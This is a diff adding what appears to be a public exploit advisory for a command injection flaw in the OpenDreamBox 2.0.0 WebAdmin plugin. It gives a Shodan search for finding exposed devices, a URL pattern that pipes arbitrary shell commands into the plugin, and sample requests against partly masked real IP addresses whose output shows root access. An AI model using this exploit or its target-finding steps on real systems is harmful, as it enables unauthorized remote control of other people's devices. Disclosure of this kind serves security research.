@@ -1,0 +1,32 @@
+# Exploit Title: OpenDreamBox 2.0.0 - Plugin WebAdmin RCE
+# Shodan Dork: "DreamBox" 200 ok"
+# Date: 07/03/17
+# Exploit Author: Jonatas Fil
+# Vendor Homepage: https://www.dreamboxupdate.com
+# Software Link: https://www.dreamboxupdate.com/opendreambox/2.0.0
+# Version: 2.0.0
+
+Vulnerabilty: Remote Command Execution via Command injection in Plugin
+WebAdmin.
+Tools: https://github.com/ninj4c0d3r/ShodanCli
+----------------------------------------------------------------------------------------------------
+p0c:
+
+- First, Search in Shodan: "DreamBox" 200 ok.
+
+(https://github.com/ninj4c0d3r/ShodanCli - My tool for search (need api) or
+https://www.shodan.io)
+
+- After, open the target and go to "Extra", wait a moment...
+
+- In plugins, if WebAdmin Plugin is installed [VULNERABLE]:
+
+Exploit : http://target.com:100000/webadmin/script?command=|YOUR_COMMAND
+
+-----------------------------------------------------------------------------------------------------
+Examples:
+
+http://212.13.x.129:8081/webadmin/script?command=|uname -a : Linux dm7020hd 3.2-dm7020hd #1 SMP Sun Jun 21 15:26:04 CEST 2015 mips GNU/Linux
+http://80.x.24.154:8880/webadmin/script?command=|id : uid=0(root) gid=0(root)
+http://62.224.234.x:8081/webadmin/script?command=|pwd : /home/root
+http://x.19.12.146:10000/webadmin/script?command=|cat /etc/issue : opendreambox 2.0.0 \n \l
